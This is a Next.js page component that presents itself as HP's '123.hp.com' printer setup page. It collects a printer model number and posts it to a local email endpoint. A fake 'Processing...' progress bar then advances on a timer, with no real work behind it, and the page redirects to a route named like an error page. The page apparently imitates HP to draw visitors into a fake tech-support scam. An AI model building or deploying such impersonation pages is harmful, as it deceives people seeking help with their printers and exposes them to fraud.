"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState, useEffect } from "react";


  const logo = "/images/hp-logo.webp";
  const hero = "/images/loader-hero.jpg";

export default function ContactPage() {
  const [hpmodel, setHpmodel] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(0);
  const router = useRouter();

  const totalSteps = 3;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setStep(0);

    try {
      const res = await fetch("/api/hpmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ hpmodel }),
      });

      const data = await res.json();

      if (data.success) {
        // Start step simulation
        let currentStep = 0;
        const interval = setInterval(() => {
          currentStep++;
          setStep(currentStep);
          if (currentStep >= totalSteps) {
            clearInterval(interval);
            setTimeout(() => router.push("/errorhpfiledat"), 500);
          }
        }, 1000);
      } else {
        alert("Failed to send email.");
        setLoading(false);
      }
    } catch (err) {
      console.error(err);
      alert("Error sending email.");
      setLoading(false);
    }
  };

  return (
    <>
      {!loading ? (
        <main
          style={{
            minHeight: "100dvh",
            display: "grid",
            placeItems: "center",
            background: "#f9fafb",
          }}
        >
          <div
            style={{
              width: "100%",
              maxWidth: 1200,
              padding: "48px 24px",
              display: "grid",
              gridTemplateColumns: "1.1fr 0.9fr",
              gap: 24,
              alignItems: "center",
            }}
          >
            <section>
              <h1
                style={{
                  fontSize: 42,
                  lineHeight: 1.1,
                  margin: 0,
                  color: "#111827",
                  fontWeight: 700,
                }}
              >
                Set up your HP printer at 123.hp.com
              </h1>
              <p style={{ marginTop: 12, fontSize: 18, color: "#374151" }}>
                Download and install your printer software
              </p>

              <form onSubmit={handleSubmit} style={{ marginTop: 24 }}>
                <input
                  type="text"
                  placeholder="Enter exact model number or name. Ex: &quot;ENVY 4520&quot;"
                  value={hpmodel}
                  onChange={(e) => setHpmodel(e.target.value)}
                  required
                  style={{
                    padding: "10px",
                    width: "100%",
                    marginBottom: "10px",
                  }}
                />
                <button type="submit" style={{ padding: "10px 20px" }}>
                  Submit
                </button>
              </form>
              <div
                style={{ marginTop: 8, fontSize: 12, color: "#6b7280" }}
              >
                Enter your HP ENVY, OfficeJet, LaserJet or DeskJet model
                number.
              </div>
            </section>

            <section style={{ display: "flex", justifyContent: "center" }}>
              <Image
                src="/images/DJPrinters.png"
                alt="HP printers"
                width={640}
                height={420}
                priority
                style={{ maxWidth: "100%", height: "auto" }}
              />
            </section>
          </div>
        </main>
      ) : (
        

<>
<div className="loadinstepwrapper">
<div className="leftside">

  <Image
                                     src={logo}
                                     alt="HP"
                                   width={99}
      height={24}
                                    priority
                                       className="h-10 w-10 object-contain"
                                  />
</div>
<div className="mtside">
<div
          style={{
            minHeight: "100dvh",
            display: "flex",
            flexDirection: "column",
            justifyContent: "center",
            alignItems: "center",
          }}
        >
          <h3>Processing...</h3>

          {/* Progress Bar */}
          <div
            style={{
              width: "80%",
              maxWidth: 400,
              height: "12px",
              backgroundColor: "#e0e0e0",
              borderRadius: "8px",
              overflow: "hidden",
              margin: "20px 0",
            }}
          >
            <div
              style={{
                height: "100%",
                width: `${(step / totalSteps) * 100}%`,
                backgroundColor: "#4caf50",
                transition: "width 0.5s ease-in-out",
              }}
            />
          </div>

          <p>
            {step} of {totalSteps} steps completed
          </p>
        </div>
</div>
<div className="rightside">

 <Image
                                     src={hero}
                                     alt="Product"
                                  width={600}
      height={220}
                                    priority
                                       className="h-10 w-10 object-contain"
                                  />
</div>
</div>
</>



      )}
    </>
  );
}
